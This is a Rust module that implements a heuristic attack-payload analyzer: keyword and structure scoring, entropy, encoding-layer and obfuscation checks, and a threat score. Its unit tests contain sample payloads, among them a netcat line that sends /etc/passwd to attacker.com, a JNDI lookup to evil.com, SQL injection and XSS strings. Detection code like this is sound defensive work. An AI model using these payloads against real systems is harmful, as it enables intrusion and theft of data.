use std::collections::HashMap;
use std::sync::LazyLock;

use regex::Regex;

mod keywords;
mod patterns;

pub use keywords::AttackKeywords;
pub use patterns::AttackStructures;

const MAX_CONTENT_LENGTH: usize = 50_000;
const MAX_TOKENS: usize = 1000;
const MAX_ENTROPY_LENGTH: usize = 10_000;
const MAX_SCAN_LENGTH: usize = 10_000;

static INJECTION_KEYWORDS: &[&str] =
    &["eval", "exec", "compile", "__import__", "globals", "locals"];

// token extraction
static WORD_RE: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\b\w+\b").expect("static regex"));

// encoding layer detection
static URL_ENC: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"%[0-9a-fA-F]{2}").expect("static regex"));
static B64_ENC: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[A-Za-z0-9+/]{4,}={0,2}").expect("static regex"));
static HEX_ENC: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?:0x)?[0-9a-fA-F]{4,}").expect("static regex"));
static UNICODE_ENC: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\\u[0-9a-fA-F]{4}").expect("static regex"));
static HTML_ENT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"&[#\w]+;").expect("static regex"));

// structural boost patterns
static SQL_STRUCT: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"(?i)\b(?:union|select|from|where)\b").expect("static regex"));
static XSS_STRUCT: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"<[^>]+>").expect("static regex"));
static CMD_STRUCT: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"[;&|]").expect("static regex"));
static PATH_STRUCT: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\.{2,}[/\\]").expect("static regex"));

// obfuscation detection
static SPECIAL_CHAR: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[^a-zA-Z0-9\s]").expect("static regex"));
static LONG_RUN: LazyLock<Regex> = LazyLock::new(|| Regex::new(r"\S{100,}").expect("static regex"));

// code injection risk
static BRACES: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[\{\}].*[\{\}]").expect("static regex"));
static FUNC_CALL: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"\w+\s*\([^)]*\)").expect("static regex"));
static DOLLAR_VAR: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[$@]\w+").expect("static regex"));
static OPERATORS: LazyLock<Regex> =
    LazyLock::new(|| Regex::new(r"[=+\-*/]{2,}").expect("static regex"));
static INJECTION_KW_RE: LazyLock<Vec<Regex>> = LazyLock::new(|| {
    INJECTION_KEYWORDS
        .iter()
        .map(|kw| Regex::new(&format!(r"(?i)\b{kw}\b")).expect("static keyword regex"))
        .collect()
});

/// A structural pattern match with surrounding context.
#[derive(Debug, Clone, PartialEq, Eq)]
pub struct SuspiciousPattern {
    /// Pattern category name from [`AttackStructures`] (one of 5 fixed values).
    pub pattern_type: &'static str,
    pub matched: String,
    /// Match start as a Unicode code-point index into the analyzed content,
    /// mirroring the Python reference (`semantic.py` emits `match.start()` on
    /// the processed `str`, so its positions are code-point indices). The
    /// `regex` crate matches on bytes internally; byte offsets are converted
    /// here at the result boundary.
    pub position: usize,
    /// Substring surrounding the match (up to 20 bytes each side, rounded to
    /// char boundaries; the Python reference window is ±20 code points).
    pub context: String,
}

/// Aggregate output of [`analyze`].
#[derive(Debug, Clone, PartialEq)]
pub struct AnalysisResult {
    /// Per-category scores (xss, sql, command, path, template) in `[0.0, 1.0]`.
    pub attack_probabilities: HashMap<&'static str, f64>,
    pub entropy: f64,
    pub encoding_layers: u32,
    pub is_obfuscated: bool,
    pub suspicious_patterns: Vec<SuspiciousPattern>,
    pub code_injection_risk: f64,
    pub token_count: usize,
}

#[doc(hidden)]
pub fn extract_tokens(content: &str, structures: &AttackStructures) -> Vec<String> {
    let content = if content.len() > MAX_CONTENT_LENGTH {
        &content[..content.floor_char_boundary(MAX_CONTENT_LENGTH)]
    } else {
        content
    };

    let lower = content.to_lowercase();
    let mut tokens: Vec<String> = WORD_RE
        .find_iter(&lower)
        .take(MAX_TOKENS)
        .map(|m| m.as_str().to_owned())
        .collect();

    // matches Python [:10] per attack_structure (semantic.py:103)
    for re in structures.compiled() {
        for m in re.find_iter(content).take(10) {
            tokens.push(m.as_str().to_owned());
        }
    }

    tokens.truncate(MAX_TOKENS);
    tokens
}

/// Shannon entropy of byte distribution, in bits.
///
/// Differs from Python `Counter(content)` which counts code points.
/// Bytes are faster (fixed 256 array) and good enough for obfuscation
/// detection. Documented in CHANGELOG "Known differences from Python".
#[must_use]
pub fn calculate_entropy(content: &str) -> f64 {
    if content.is_empty() {
        return 0.0;
    }

    let content = if content.len() > MAX_ENTROPY_LENGTH {
        &content[..content.floor_char_boundary(MAX_ENTROPY_LENGTH)]
    } else {
        content
    };

    let mut counts = [0u32; 256];
    let len = content.len() as f64;

    for byte in content.bytes() {
        counts[byte as usize] += 1;
    }

    counts
        .iter()
        .filter(|&&c| c > 0)
        .map(|&c| {
            let p = f64::from(c) / len;
            -p * p.log2()
        })
        .sum()
}

/// Count encoding layers present (URL, base64, hex, unicode escape, HTML entity).
#[must_use]
pub fn detect_encoding_layers(content: &str) -> u32 {
    let content = if content.len() > MAX_SCAN_LENGTH {
        &content[..content.floor_char_boundary(MAX_SCAN_LENGTH)]
    } else {
        content
    };

    [&*URL_ENC, &*B64_ENC, &*HEX_ENC, &*UNICODE_ENC, &*HTML_ENT]
        .iter()
        .map(|re| u32::from(re.is_match(content)))
        .sum()
}

#[doc(hidden)]
#[must_use]
pub fn analyze_attack_probability(
    content: &str,
    keywords: &AttackKeywords,
    structures: &AttackStructures,
) -> HashMap<&'static str, f64> {
    let tokens = extract_tokens(content, structures);
    attack_probability_with_tokens(content, &tokens, keywords)
}

/// Heuristic check for obfuscated content based on entropy, encoding
/// layer count, special character ratio, and long unbroken sequences.
#[must_use]
pub fn detect_obfuscation(content: &str) -> bool {
    obfuscation_with_inputs(
        content,
        calculate_entropy(content),
        detect_encoding_layers(content),
    )
}

#[doc(hidden)]
#[must_use]
pub fn extract_suspicious_patterns(
    content: &str,
    structures: &AttackStructures,
) -> Vec<SuspiciousPattern> {
    structures
        .named()
        .iter()
        .flat_map(|&(name, ref re)| {
            // find_iter yields non-overlapping matches in ascending byte
            // order, so a running cursor converts byte offsets to code-point
            // indices in O(n) per regex instead of rescanning from position 0
            let mut byte_cursor = 0usize;
            let mut char_cursor = 0usize;
            re.find_iter(content).map(move |m| {
                char_cursor += content[byte_cursor..m.start()].chars().count();
                byte_cursor = m.start();

                let ctx_start = content.floor_char_boundary(m.start().saturating_sub(20));
                let ctx_end = content.ceil_char_boundary(m.end() + 20);

                SuspiciousPattern {
                    pattern_type: name,
                    matched: m.as_str().to_owned(),
                    position: char_cursor,
                    context: content[ctx_start..ctx_end].to_owned(),
                }
            })
        })
        .collect()
}

#[doc(hidden)]
#[must_use]
pub fn analyze_code_injection_risk(content: &str) -> f64 {
    let risk = check_code_pattern_risks(content) + check_injection_keywords(content);
    risk.min(1.0)
}

/// Run all analysis passes on `content` and return an [`AnalysisResult`].
///
/// Computes attack probabilities, entropy, encoding layers, obfuscation
/// detection, suspicious pattern extraction, and code injection risk in
/// a single pass. Each shared computation (tokens, entropy, encoding
/// layers) runs exactly once.
#[must_use]
pub fn analyze(
    content: &str,
    keywords: &AttackKeywords,
    structures: &AttackStructures,
) -> AnalysisResult {
    let tokens = extract_tokens(content, structures);
    let entropy = calculate_entropy(content);
    let encoding_layers = detect_encoding_layers(content);
    let token_count = tokens.len();

    AnalysisResult {
        attack_probabilities: attack_probability_with_tokens(content, &tokens, keywords),
        entropy,
        encoding_layers,
        is_obfuscated: obfuscation_with_inputs(content, entropy, encoding_layers),
        suspicious_patterns: extract_suspicious_patterns(content, structures),
        code_injection_risk: analyze_code_injection_risk(content),
        token_count,
    }
}

/// Weighted aggregate of an [`AnalysisResult`] into a single `[0.0, 1.0]`
/// threat score.
///
/// Weights: attack probability 30%, obfuscation 20%, encoding layers 10-20%,
/// code injection risk 20%, suspicious pattern count 5-10%.
#[must_use]
pub fn get_threat_score(result: &AnalysisResult) -> f64 {
    let mut score = 0.0;

    if !result.attack_probabilities.is_empty() {
        let max_prob = result
            .attack_probabilities
            .values()
            .copied()
            .fold(0.0_f64, f64::max);
        score = max_prob.mul_add(0.3, score);
    }

    if result.is_obfuscated {
        score += 0.2;
    }

    if result.encoding_layers > 0 {
        score += (f64::from(result.encoding_layers) * 0.1).min(0.2);
    }

    score = result.code_injection_risk.mul_add(0.2, score);

    if !result.suspicious_patterns.is_empty() {
        score += (result.suspicious_patterns.len() as f64 * 0.05).min(0.1);
    }

    score.min(1.0)
}

// caller already has tokens
fn attack_probability_with_tokens(
    content: &str,
    tokens: &[String],
    keywords: &AttackKeywords,
) -> HashMap<&'static str, f64> {
    let token_set: std::collections::HashSet<&str> = tokens.iter().map(String::as_str).collect();
    let mut probabilities = HashMap::new();

    for (&attack_type, kw_set) in keywords.all() {
        if kw_set.is_empty() {
            probabilities.insert(attack_type, 0.0);
            continue;
        }

        let matches = token_set.iter().filter(|t| kw_set.contains(**t)).count();
        let base = matches as f64 / kw_set.len() as f64;
        let boost = structural_boost(attack_type, content);

        probabilities.insert(attack_type, (base + boost).min(1.0));
    }

    probabilities
}

// caller already has entropy + encoding_layers
fn obfuscation_with_inputs(content: &str, entropy: f64, encoding_layers: u32) -> bool {
    entropy > 4.5
        || encoding_layers > 2
        || {
            let special_count = SPECIAL_CHAR.find_iter(content).count();
            special_count as f64 / content.chars().count().max(1) as f64 > 0.4
        }
        || LONG_RUN.is_match(content)
}

fn structural_boost(attack_type: &str, content: &str) -> f64 {
    let re = match attack_type {
        "xss" => &*XSS_STRUCT,
        "sql" => &*SQL_STRUCT,
        "command" => &*CMD_STRUCT,
        "path" => &*PATH_STRUCT,
        _ => return 0.0,
    };

    if re.is_match(content) { 0.3 } else { 0.0 }
}

fn check_code_pattern_risks(content: &str) -> f64 {
    let mut risk = 0.0;

    if BRACES.is_match(content) {
        risk += 0.2;
    }
    if FUNC_CALL.is_match(content) {
        risk += 0.2;
    }
    if DOLLAR_VAR.is_match(content) {
        risk += 0.1;
    }
    if OPERATORS.is_match(content) {
        risk += 0.1;
    }

    risk
}

fn check_injection_keywords(content: &str) -> f64 {
    if INJECTION_KW_RE.iter().any(|re| re.is_match(content)) {
        0.2
    } else {
        0.0
    }
}

#[cfg(test)]
mod tests {
    use super::*;

    fn kw() -> AttackKeywords {
        AttackKeywords::default()
    }
    fn st() -> AttackStructures {
        AttackStructures::default()
    }

    #[test]
    fn entropy() {
        assert!(calculate_entropy("").abs() < f64::EPSILON);
        assert!(calculate_entropy(&"abcdefghij".repeat(200)) > 3.0);
    }

    #[test]
    fn encoding_layers() {
        assert!(detect_encoding_layers("%3Cscript%3E") >= 1);
        assert!(detect_encoding_layers("normal text &lt;script&gt;alert(1)&lt;/script&gt;") >= 1);
        // multiple layer types
        assert!(detect_encoding_layers("%3C &lt; \\u003C 0x3C3C AAAA==") >= 3);

        // combined layers also trigger obfuscation
        let content = "%3Cscript%3E&lt;test&gt;\\u0041\\u0042";
        assert!(detect_encoding_layers(content) > 2);
        assert!(detect_obfuscation(content));

        // max scan length must not panic on large input
        let content = format!("{}{}", "normal text ".repeat(1000), "%3Cscript%3E");
        let _ = detect_encoding_layers(&content);
        // regression: 3-byte char (hiragana) so MAX_SCAN_LENGTH lands mid-codepoint
        let _ = detect_encoding_layers(&"\u{3042}".repeat(4000));
    }

    #[test]
    fn attack_probability_detection() {
        let probs = analyze_attack_probability("<img src=x onerror=alert(1)>", &kw(), &st());
        assert!(probs["xss"] > 0.3);

        let probs =
            analyze_attack_probability("1' OR '1'='1' UNION SELECT * FROM users--", &kw(), &st());
        assert!(probs["sql"] > 0.3);

        // mixed case
        assert!(
            analyze_attack_probability("SeLeCt * FrOm UsErS UnIoN sElEcT", &kw(), &st())["sql"]
                > 0.0
        );
        // command
        assert!(
            analyze_attack_probability(
                "test; cat /etc/passwd | nc attacker.com 9999",
                &kw(),
                &st()
            )["command"]
                > 0.3
        );
        assert!(
            analyze_attack_probability("exec command; cat /etc/passwd | grep root", &kw(), &st())["command"]
                > 0.3
        );
        // path
        assert!(analyze_attack_probability("../../etc/passwd", &kw(), &st())["path"] > 0.3);
        // unicode content
        assert!(
            analyze_attack_probability(
                "测试 <script>alert('χαίρετε')</script> اختبار",
                &kw(),
                &st()
            )["xss"]
                > 0.0
        );
    }

    #[test]
    fn obfuscation_detection() {
        // high entropy
        let content: String = (0u32..100)
            .map(|i| char::from(b'!' + ((i * 7 + 13) % 94) as u8))
            .collect();
        assert!(detect_obfuscation(&content));

        // special char ratio
        assert!(detect_obfuscation(
            &("!@#$%^&*()_+{}[]|\\:;\"'<>,.?/~`".to_owned().repeat(3) + "normal")
        ));
        // long unbroken run
        assert!(detect_obfuscation(&"a".repeat(150)));
    }

    #[test]
    fn code_injection_risk() {
        assert!(analyze_code_injection_risk("{malicious} code {injection}") >= 0.2);
        assert!(analyze_code_injection_risk("eval(user_input) and exec(command)") >= 0.4);
        assert!(analyze_code_injection_risk("$variable @another_var ${complex}") >= 0.1);
    }

    #[test]
    fn full_analysis_and_threat_score() {
        let content = "<script>eval('alert(1)')</script> UNION SELECT * FROM users";
        let result = analyze(content, &kw(), &st());
        assert!(result.attack_probabilities["xss"] > 0.0);
        assert!(result.attack_probabilities["sql"] > 0.0);
        assert!(result.attack_probabilities.contains_key("command"));
        assert!(result.entropy > 0.0);
        assert!(result.token_count > 0);

        // threat score is bounded and non-trivial for this input
        let score = get_threat_score(&result);
        assert!((0.0..=1.0).contains(&score));

        // explicit high-score result
        let high = AnalysisResult {
            attack_probabilities: HashMap::from([("xss", 0.8), ("sql", 0.6)]),
            entropy: 5.0,
            encoding_layers: 2,
            is_obfuscated: true,
            suspicious_patterns: vec![
                SuspiciousPattern {
                    pattern_type: "tag_like",
                    matched: "<script>".into(),
                    position: 0,
                    context: "<script>".into(),
                },
                SuspiciousPattern {
                    pattern_type: "function_call",
                    matched: "alert(1)".into(),
                    position: 8,
                    context: "alert(1)".into(),
                },
            ],
            code_injection_risk: 0.5,
            token_count: 10,
        };
        assert!(get_threat_score(&high) > 0.5);

        // zero result scores zero
        let zero = AnalysisResult {
            attack_probabilities: HashMap::new(),
            entropy: 0.0,
            encoding_layers: 0,
            is_obfuscated: false,
            suspicious_patterns: vec![],
            code_injection_risk: 0.0,
            token_count: 0,
        };
        assert!(get_threat_score(&zero).abs() < f64::EPSILON);
    }

    #[test]
    fn keywords_initialized() {
        let keywords = kw();
        let all = keywords.all();
        assert!(all["xss"].contains("script"));
        assert!(all["sql"].contains("select"));
        assert!(all["command"].contains("exec"));

        for key in ["xss", "sql", "command", "path", "template"] {
            assert!(all.contains_key(key));
        }
        assert!(analyze_attack_probability("test content", &kw(), &st())["template"] < 0.5);
    }

    #[test]
    fn extract_tokens_limits() {
        let tokens = extract_tokens(&"a ".repeat(30000), &st());
        assert!(tokens.len() <= MAX_TOKENS);
    }

    #[test]
    fn suspicious_patterns() {
        let content = "normal <script>alert(1)</script> text with function() call";
        let patterns = extract_suspicious_patterns(content, &st());
        assert!(!patterns.is_empty());
        assert!(patterns.iter().any(|p| p.pattern_type == "tag_like"));
        for p in &patterns {
            assert!(!p.pattern_type.is_empty());
            assert!(!p.matched.is_empty());
            assert!(!p.context.is_empty());
        }
    }

    #[test]
    fn template_injection() {
        let result = analyze(
            "{{7*7}} ${jndi:ldap://evil.com/a} {%if%}evil{%endif%}",
            &kw(),
            &st(),
        );
        assert!(!result.suspicious_patterns.is_empty());
    }

    #[test]
    fn obfuscated_base64() {
        let result = analyze("PHNjcmlwdD5hbGVydCgxKTwvc2NyaXB0Pg==", &kw(), &st());
        assert!(result.is_obfuscated);
        assert!(result.encoding_layers > 0);
    }

    #[test]
    fn performance_large_input() {
        let content = format!("{}<script>alert(1)</script>", "normal text ".repeat(10000));
        let start = std::time::Instant::now();
        let result = analyze(&content, &kw(), &st());
        assert!(start.elapsed().as_secs_f64() < 1.0);
        assert!(result.token_count <= MAX_TOKENS);
    }

    // regression: emoji padding so context window (±20 bytes) lands mid-codepoint
    #[test]
    fn multibyte_no_panic() {
        let pad = "\u{1F600}".repeat(8);
        let content = format!("{pad}<script>alert(1)</script>{pad}");
        let patterns = extract_suspicious_patterns(&content, &st());
        for p in &patterns {
            assert!(content.is_char_boundary(p.position));
        }
        assert!(!patterns.is_empty());
        let result = analyze(&content, &kw(), &st());
        assert!(result.token_count > 0);
    }

    // positions are Unicode code-point indices (Python str index space, the
    // reference semantic.py emits match.start() on the processed str), not
    // byte offsets. Expected values pinned against the Python reference.
    #[test]
    fn suspicious_pattern_positions_are_codepoint_indices() {
        // CJK padding: 10 code points = 30 bytes, so byte offsets would be 30/54
        let content = "测试测试测试测试测试<script>alert(1)</script>";
        let tag_like: Vec<_> = extract_suspicious_patterns(content, &st())
            .into_iter()
            .filter(|p| p.pattern_type == "tag_like")
            .collect();
        assert_eq!(tag_like[0].matched, "<script>");
        assert_eq!(tag_like[0].position, 10);
        assert_eq!(tag_like[1].matched, "</script>");
        assert_eq!(tag_like[1].position, 26);

        // emoji padding: 8 code points = 32 bytes
        let content = format!("{}<script>alert(1)</script>", "\u{1F600}".repeat(8));
        let tag_like: Vec<_> = extract_suspicious_patterns(&content, &st())
            .into_iter()
            .filter(|p| p.pattern_type == "tag_like")
            .collect();
        assert_eq!(tag_like[0].position, 8);
        assert_eq!(tag_like[1].position, 24);

        // multibyte gaps between matches exercise the incremental
        // byte -> code-point cursor across several matches
        let content = "您好<script>a</script>世界<b>ok</b>";
        let tag_positions: Vec<_> = extract_suspicious_patterns(content, &st())
            .into_iter()
            .filter(|p| p.pattern_type == "tag_like")
            .map(|p| (p.matched, p.position))
            .collect();
        assert_eq!(
            tag_positions,
            [
                ("<script>".to_owned(), 2),
                ("</script>".to_owned(), 11),
                ("<b>".to_owned(), 22),
                ("</b>".to_owned(), 27),
            ]
        );

        // match before multibyte content: trailing chars must not shift it
        let content = "alert(1) 测试 мир \u{1F600}";
        let fc = extract_suspicious_patterns(content, &st())
            .into_iter()
            .find(|p| p.pattern_type == "function_call")
            .expect("function_call match");
        assert_eq!(fc.matched, "alert(1)");
        assert_eq!(fc.position, 0);

        // two-byte accented chars before the match
        let content = "café naïve <img src=x onerror=alert(1)>";
        let patterns = extract_suspicious_patterns(content, &st());
        let tag = patterns
            .iter()
            .find(|p| p.pattern_type == "tag_like")
            .expect("tag_like match");
        assert_eq!(tag.position, 11);
        let fc = patterns
            .iter()
            .find(|p| p.pattern_type == "function_call")
            .expect("function_call match");
        assert_eq!(fc.matched, "alert(1)");
        assert_eq!(fc.position, 30);
    }
}

#[cfg(test)]
mod coverage_tests {
    use super::*;

    #[test]
    fn empty_keyword_sets_yield_zero_probabilities() {
        let keywords = AttackKeywords::default();
        // every type with an empty keyword set records a 0.0 probability
        let tokens: Vec<String> = vec![].into_iter().collect();
        let probs = attack_probability_with_tokens("content", &tokens, &keywords);
        assert!(probs.values().all(|v| *v == 0.0));
    }
}
